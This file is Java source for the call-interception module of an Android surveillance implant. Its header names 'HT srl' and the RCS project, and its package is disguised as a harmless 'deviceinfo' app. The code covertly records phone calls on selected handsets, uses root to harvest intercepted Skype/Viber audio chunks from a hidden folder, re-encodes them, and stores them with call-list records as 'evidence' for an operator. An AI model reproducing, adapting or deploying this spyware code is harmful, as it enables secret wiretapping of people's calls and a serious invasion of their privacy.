/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.BlockingQueue;

import android.media.AmrInputStream;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.FileObserver;

import com.android.deviceinfo.Call;
import com.android.deviceinfo.Device;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.evidence.Markup;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerCall;
import com.android.deviceinfo.resample.Resample;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DataBuffer;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.Utils;
import com.android.deviceinfo.util.WChar;
import com.musicg.wave.Wave;
import com.musicg.wave.WaveHeader;

public class ModuleCall extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	private static final int HEADER_SIZE = 6;
	private MediaRecorder recorder = null;
	private boolean recordFlag;
	private String currentRecordFile;
	// private Date fromTime;
	// private String number, model;
	private int strategy = 0;

	private static final int CALLIST_PHONE = 0x0;
	private static final int CALLIST_SKYPE = 0x1;
	private static final int CALLIST_VIBER = 0x2;

	// From audio.h, Android 4.x
	private static final int AUDIO_STREAM_VOICE_CALL = 0;
	private static final int AUDIO_STREAM_SYSTEM     = 1;
	private static final int AUDIO_STREAM_RING       = 2;
	private static final int AUDIO_STREAM_MUSIC      = 3;
	private static final int AUDIO_STREAM_MIC		 = -2; // Defined by us, not by Android

	private String audioStorage;
	private FileObserver observer;
	private Thread queueMonitor;
	private static final Object sync = new Object();
	private static BlockingQueue<String> calls;
	private EncodingTask encodingTask;

	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };

	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };

	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				recordFlag = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				recordFlag = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);

		if (recordFlag) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}

		// Start monitoring the filesystem
		if (Status.haveRoot() && createAudioStorage() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): starting audio storage management");
			}
			
			calls = new LinkedBlockingQueue<String>();
			
			// Remove stray .bin files
			purgeAudio();
			
			// Scan for previously stored audio files
			scrubAudio();
			
			// Start the monitor and encoding thread
			encodingTask = new EncodingTask(sync, calls);
			
			queueMonitor = new Thread(encodingTask);
			queueMonitor.start();
			
			// Give it time to spawn before signaling
			Utils.sleep(500);
			
			while (queueMonitor.isAlive() == false) {
				Utils.sleep(250);
			}
			
			// Tell the thread to process scrubbed files
			encodingTask.wake();

			// Observe our audio storage
			observer = new FileObserver(audioStorage, FileObserver.MOVED_TO) {
				@Override
				public void onEvent(int event, String file) {
					// Add to list
					if (addToEncodingList(audioStorage + file) == true) {
						synchronized(sync) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
							}
							
							encodingTask.wake();
						}
					}
				}
			};

			observer.startWatching();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): cannot create audio storage");
			}
		}
	}

	private void purgeAudio() {
		// Scrub for existing files on FS
		File f = new File(audioStorage);
		
		FilenameFilter filter = new FilenameFilter() {
		    public boolean accept(File dir, String name) {
		        return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".bin"));
		    }
		};
		
		File file[] = f.listFiles(filter);
		long now = System.currentTimeMillis() / 1000;
		
		// Remove old files
		for (File storedFile : file) {
			String fullName = storedFile.getAbsolutePath();
			
			// Stored filetime (unix epoch() is in seconds not ms)
			String split[] = fullName.split("-");
			long epoch = Long.parseLong(split[1]);
			
			// Files older than 24 hours are removed
			if (now - epoch > 60 * 60 * 24) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " whic is: " + (now - epoch)/3600 + " hours old");
				}
				
				storedFile.delete();
			}
		}
	}
	
	private void scrubAudio() {
		// Scrub for existing files on FS
		File f = new File(audioStorage);
		
		FilenameFilter filter = new FilenameFilter() {
		    public boolean accept(File dir, String name) {
		        return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".tmp"));
		    }
		};
		
		File file[] = f.listFiles(filter);

		// Che palle Java!
		List<File> filesList = new java.util.ArrayList<File>();	
		filesList.addAll(java.util.Arrays.asList(file));
		java.util.Collections.sort(filesList);
		
		// Adding scrubbed files
		for (File storedFile : filesList) {
			String fullName = storedFile.getAbsolutePath();
			
			addToEncodingList(fullName);
		}
	}

	class EncodingTask implements Runnable {
	    Object sync;
	    BlockingQueue<String> queue;
	    boolean stopQueueMonitor;
	    
	    EncodingTask(Object t, BlockingQueue<String> l) {
	    	sync = t;
	    	queue = l;
	    }
	    
	    public void stop() {
	    	stopQueueMonitor = true;
	    	
			wake();
	    }
	    
	    public void wake() {
	    	synchronized(sync) {
				sync.notify();
			}
	    }
	    
	    public void run() {
	        while(true) {
	            synchronized (sync) {
	                try {
	                	sync.wait();
	                } catch (InterruptedException e) {
						if (Cfg.EXCEPTION) {
							Check.log(e);
						}
	                }
	            }
	            
	            if (stopQueueMonitor) {
	            	if (Cfg.DEBUG) {
						Check.log(TAG + "(EncodingTask run): killing audio encoding thread");
					}
	            	
	            	return;
	            }
	            
	            if (Cfg.DEBUG) {
					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
				}
	            
	            // Browse lists and check if an encoding is already in progress
	            try {
	            	while (queue.isEmpty() == false) {
						String file = queue.take();
						
		            	// Check if end of conversation
			            if (Cfg.DEBUG) {
							Check.log(TAG + "(EncodingTask run): decoding " + file);
						}
			            
			            encodeChunks(file);
	            	}
	            		
	            	// Encode
		            //encodeAudio(data);
				} catch (Exception e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}
				}
	        }
	    }
	}

	synchronized private boolean addToEncodingList(String s) {	
		if (s.contains("Qi-") == false || (s.endsWith("-l.tmp") == false && s.endsWith("-r.tmp") == false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
			}
			
			return false;
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
		}
		
		// Add the file to the list	
		calls.add(s);
		
		return true;
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);

		if (Status.haveRoot()) {
			if (queueMonitor.isAlive()) {
				encodingTask.stop();
			}
			
			observer.stopWatching();
		}
	}

    public int notification(final Call call) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG
					+ " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
		}

		if (call.isOffhook() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
			}
			return 0;
		}

		final boolean incoming = call.isIncoming();
		boolean recording = false;

		try {
			// Let's start with call recording
			if (recordFlag && isSupported()) {
				recording = recordCall(call, incoming);
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " ERROR (notification), ", ex);
			}
		}

		if (!recordFlag && !call.isOngoing()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
			}

			String from = call.getFrom();
			String to = call.getTo();

			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
		}

		return 0;
	}

	private boolean recordCall(final Call call, final boolean incoming) {
		if (!call.isOngoing()) {
			if (stopRecord()) {
				Object future = Status.self().getStpe().schedule(new Runnable() {
					public void run() {
						saveCallEvidence(call.getNumber(), incoming, call.getTimeBegin(), call.getTimeEnd(),
								currentRecordFile);
					}
				}, 100, TimeUnit.MILLISECONDS);

				// Se un giorno la conf non dovesse includere gia' tutti
				// i moduli,
				// self() tornerebbe NULL in quanto non instanziato.
				ModuleMic mic = ModuleMic.self();

				if (mic != null) {
					mic.resume();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
			}

			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
		}

		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;

		Long ts = Long.valueOf(System.currentTimeMillis());
		String tmp = ts.toString();

		// Logfile .3gpp in chiaro, temporaneo
		String path = Path.hidden() + tmp + ".qzt";

		ModuleMic mic = ModuleMic.self();

		if (mic != null) {
			mic.suspend();
		}

		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
			}

		} else {
			recordFlag = false;
		}

		mic = ModuleMic.self();

		if (mic != null) {
			mic.resume();
		}

		return false;
	}

	private boolean saveCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd,
			String currentRecordFile) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + dateBegin
					+ " to: " + dateEnd + " incoming: " + incoming);
		}

		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
				dateEnd));

		AutoFile file = new AutoFile(currentRecordFile);
		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
			}

			int offset = 0;
			byte[] header = file.read(0, 6);

			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveCallEvidence): AMR header");
				}
				offset = AMR_HEADER.length;
			}

			byte[] data = file.read(offset);
			int pos = checkIntegrity(data);

			if (pos != data.length) {
				data = ByteArray.copy(data, 0, pos);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
			}

			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
			}

			file.delete();

			return true;
		} else {
			return false;
		}
	}
	
	private int checkIntegrity(byte[] data) {
		int pos = 0;
		int chunklen = 0;

		while (pos < data.length) {
			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];

			if (chunklen == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
				}
			}

			pos += chunklen + 1;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkIntegrity): end");
		}

		return pos;
	}

	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime dateBegin, DateTime dateEnd) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData): " + number);
		}

		if (Cfg.DEBUG) {
			Check.asserts(number != null, " (getCallAdditionalData) Assert failed, null number");
		}

		byte[] caller;
		byte[] callee;

		if (incoming) {
			callee = WChar.getBytes(Device.self().getPhoneNumber());
			caller = WChar.getBytes(number);
		} else {
			caller = WChar.getBytes(Device.self().getPhoneNumber());
			callee = WChar.getBytes(number);
		}

		final int version = 2008121901; // CALL_LOG_VERSION
		final int program = 0x0145; // LOGTYPE_CALL_MOBILE
		final int LOG_AUDIO_CODEC_AMR = 0x1;
		int channel = 1;
		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;

		int len = 20 + 16 + 8 + caller.length + callee.length;
		final byte[] additionaldata = new byte[len];
		final DataBuffer additionalData = new DataBuffer(additionaldata, 0, len);
		
		additionalData.writeInt(version);
		additionalData.writeInt(channel);
		additionalData.writeInt(program);
		additionalData.writeInt(sampleRate);
		additionalData.writeInt(incoming ? 1 : 0);
		additionalData.writeLong(dateBegin.getFiledate());
		additionalData.writeLong(dateEnd.getFiledate());

		additionalData.writeInt(caller.length);
		additionalData.writeInt(callee.length);

		additionalData.write(caller);
		additionalData.write(callee);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition() , len);
		}

		if (Cfg.DEBUG) {
			Check.asserts(additionalData.getPosition() == len, " (getCallAdditionalData) Assert failed, wrong len: "
					+ additionalData.getPosition() + ", wanted len:" + len);
		}

		return additionaldata;
	}

	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
			int duration) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
		}

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		// Adding header
		try {

			int flags = incoming ? 1 : 0;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCalllistEvidence) %s: %ss", fromTime, duration);
			}

			outputStream.write(ByteArray.intToByteArray((int) (fromTime.getTime() / 1000)));
			outputStream.write(ByteArray.intToByteArray(programId));
			outputStream.write(ByteArray.intToByteArray(flags));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(ByteArray.intToByteArray(duration));
			outputStream.write(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));

		} catch (IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
			return;
		}

		byte[] data = outputStream.toByteArray();
		EvidenceReference.atomic(EvidenceType.CALLLISTNEW, null, data);
	}

	private boolean isSupported() {
		String model = Build.MODEL.toLowerCase();
		boolean supported = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
		}
		// TODO: in Messages
		if (model.contains("i9100")) { // Samsung Galaxy S2
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
			}
		} else if (model.contains("galaxy nexus")) { // Samsung Galaxy Nexus
			supported = true;
			strategy = MediaRecorder.AudioSource.DEFAULT;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
			}
		} else if (model.contains("gt-i9300")) { // Galaxy S3
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
			}
		} else if (model.contains("xt910")) { // Motorola xt-910
			supported = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
			}
		} else if (model.contains("gt-p1000")) { // Samsung Galaxy Tab 7''
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
			}
		}

		recordFlag = supported;
		return supported;
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name));
		}
	}

	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
		recorder = new MediaRecorder();

		recorder.setAudioSource(audioSource);
		recorder.setOutputFormat(outputFormat);
		// REMOVE
		// recorder.setAudioChannels(1);

		recorder.setAudioEncoder(audioEncoder);
		recorder.setOutputFile(path);

		try {
			recorder.prepare();
			recorder.start();
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startRecord) Error: cannot start recording");
			}

			recorder = null;
			return false;
		}

		currentRecordFile = path;
		return true;
	}

	private boolean stopRecord() {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}

			return false;
		}

		recorder.stop();
		recorder.release();
		recorder = null;
		return true;
	}

	private int getStrategyNotYetWorking() {
		Markup markupCallStrategy = new Markup(this);
		HashMap<Integer, Boolean> strategyMap = null;

		// the markup exists, try to read it
		try {
			if (markupCallStrategy.isMarkup()) {
				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
			}

			// First time we run, let's try a strategy
			if (strategyMap == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
				}

				// Start with strategy 1
				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
				boolean res;

				strategyMap = new HashMap<Integer, Boolean>();

				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);

				// Strategy 0x04
				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
				}

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_CALL;
				}

				// Strategy 0x02
				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_UPLINK;
				}

				// Strategy 0x03
				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
				}

				// Strategy 0x01
				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.MIC, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.MIC;
				}

				markupCallStrategy.writeMarkupSerializable(strategyMap);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
				}
			} else { // Return the winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
				}

				for (Integer i : strategyMap.keySet()) {
					boolean testedStrategy = strategyMap.get(i);

					if (testedStrategy == true) {
						// Return the winning strategy
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
						}

						return i;
					}
				}

				// Ok we don't have a winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
				}

				return 0;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
			}
		}

		return 0;
	}

	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
		// Create dummy file
		Long ts = new Long(System.currentTimeMillis());
		String tmp = ts.toString();
		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
		boolean success = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
		}

		startRecord(audioSource, outputFormat, audioEncoder, path);

		// Utils.sleep(250);

		stopRecord();

		File dummy = new File(path);

		if (dummy.length() > 0) {
			success = true;
		}

		dummy.delete();
		dummy = null;

		return success;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}

	// start: call start date
	// sec_length: call length in seconds
	// type: call type (Skype, Viber, Paltalk, Hangout)
	private boolean encodeChunks(String f) throws IOException {
		int end_of_call = 0xF00DF00D;
		int epoch, streamType, sampleRate = 44100, blockLen;
		int discard_frame_size = 8;
		
		// header format - each field is 4 bytes le :
		// epoch : streamType : sampleRate : blockLen
		File raw = new File(f);

		FileInputStream in = null;

		try {
			in = new FileInputStream(raw);
			
			byte data[] = new byte[(int)raw.length()];
			in.read(data, 0, (int)raw.length());
			
			ByteBuffer d = ByteBuffer.wrap(data);
			d.order(ByteOrder.LITTLE_ENDIAN);
			
			data = null;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodeChunks): Parsing " + f);
			}
			
			int data_size = 0, last_epoch = 0, first_epoch = 0;
			
			// First round calculates the bitrate and real size of audio data
			while (d.remaining() > 0) {
				int cur_epoch = d.getInt();
				
				d.position(d.position() + 8); // Discard streamType and sampleRate
				blockLen = d.getInt();

				// Discarded bytes must be discarded in the next loop too
				if (blockLen != discard_frame_size) {
					if (first_epoch == 0) {
						first_epoch = cur_epoch;
					}
					
					data_size += blockLen; // Get blockLen
					last_epoch = cur_epoch;
				}
				
				if (Cfg.DEBUG) {
					//Check.log(TAG + "(encodeChunks): blockLen: " + blockLen + " remaining: " + d.remaining() + " current position: " + d.position() + " next position: " + (d.position() + blockLen));
				}
				
				d.position(d.position() + blockLen);
			}
			
			// Let's start again
			d.rewind();
			
			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodeChunks): raw data size: " + data_size + " bytes, file length: " + (last_epoch - first_epoch) + " seconds");
			}
			
			byte[] rawPcm = new byte[data_size];
			int pos = 0;
			boolean call_finished = false;
			
			// Second round extracts only the audio data
			while (d.remaining() > 0) {
				epoch = d.getInt();
				streamType = d.getInt();
				sampleRate = d.getInt();
				blockLen = d.getInt();
				
				if (Cfg.DEBUG) {
					//Check.log(TAG + "(encodeChunks): epoch: " + epoch + " streamType: " + streamType + " sampleRate: " + sampleRate + " blockLen: " + blockLen);
				}
				
				if (blockLen == 0 && streamType == end_of_call) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(encodeChunks): end of call reached for " + f);
					}
					
					call_finished = true;
					
					if (d.remaining() > 0) {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(encodeChunks): ***WARNING*** end of call reached and still " + d.remaining() + " bytes remaining!");
						}
					}
					
					continue;
				}
				
				if (blockLen == discard_frame_size) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
					}
					
					d.position(d.position() + blockLen);
					continue;
				}
				
				byte[] rawPcmBlock = new byte[blockLen];
				d.get(rawPcmBlock);
				
				System.arraycopy(rawPcmBlock, 0, rawPcm, pos, rawPcmBlock.length);
				pos += blockLen;
			}
			
			int bitRate = getBitrate(last_epoch - first_epoch, data_size);
			
			// Ideally the sample rate should be the same for every chunk... Ideally...
			if (bitRate < 0) {
				// Borderline case in which we are unable to infer the real value
				bitRate = sampleRate;
			}
			
			WaveHeader header = Resample.createHeader(bitRate, rawPcm.length);
			
			// Resample audio
			Wave wave = Resample.resampleRaw(header, rawPcm);
			
			// Now rawPcm contains the raw data
			String encodedFile = f + ".err";
			
			if (encodetoAmr(encodedFile, wave.getBytes())) {
				boolean incoming = encodedFile.endsWith("-r.tmp.err");
				
				// Encode to evidence
				Date begin = new Date(first_epoch * 1000L);
				Date end = new Date(last_epoch * 1000L);
				
				saveCallEvidence("+666", incoming, begin, end, encodedFile);
			}
			
			if (call_finished) {
				// After encoding create the end of call marker
			}
			
			// Remove file
			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodeChunks): deleting " +  f);
			}
			
			//raw.delete();
		} finally {
			if (in != null) {
				in.close();
			}
		}
		
		return true;
	}

	private boolean encodetoAmr(String outFile, byte[] raw) {
	    File file = new File(outFile);
	    
	    try {		
	    	InputStream inStream = new ByteArrayInputStream(raw);
	    	AmrInputStream aStream = new AmrInputStream(inStream);
	    	
	    	file.createNewFile();
			
		    OutputStream out = new FileOutputStream(file); 
			
		    out.write(0x23);
		    out.write(0x21);
		    out.write(0x41);
		    out.write(0x4D);
		    out.write(0x52);
		    out.write(0x0A);    
		
		    byte[] buf = new byte[4096];
		    int len;
		    
		    while ((len = aStream.read(buf)) > 0) {
		        out.write(buf, 0, len);
		    }
		
		    out.close();
		    aStream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
			
			return false;
		}
	    
	    return true;
	}

	private boolean createAudioStorage() {
		// Create storage directory
		audioStorage = Path.hidden() + "gub/";

		if (Path.createDirectory(audioStorage) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
			}

			return true;
		}
	}
	
	private int getBitrate(int delta, int data_size) {
		float min = Float.MAX_VALUE;
		int bitrates[] = {8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000};
		int calc = -1;
		
		if (delta <= 0 || data_size <= 0) {
			return -1;
		}
		
		int bitrate = (data_size / 2) / delta; // 16-bit PCM
		
		// Calculate the closest possible real value, yep it can be optimized:
		// if t > min: return prev_bitrate
		for (int b : bitrates) {
			float t = (float)bitrate / (float)b;
			
			t = Math.abs(1.0f - t);
			
			if (t < min) {
				calc = b;
				min = t;
			}
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + "(getBitrate): bitrate declared: " + bitrate + " bitrate inferred: " + calc);
		}
		
		return calc;
	}
}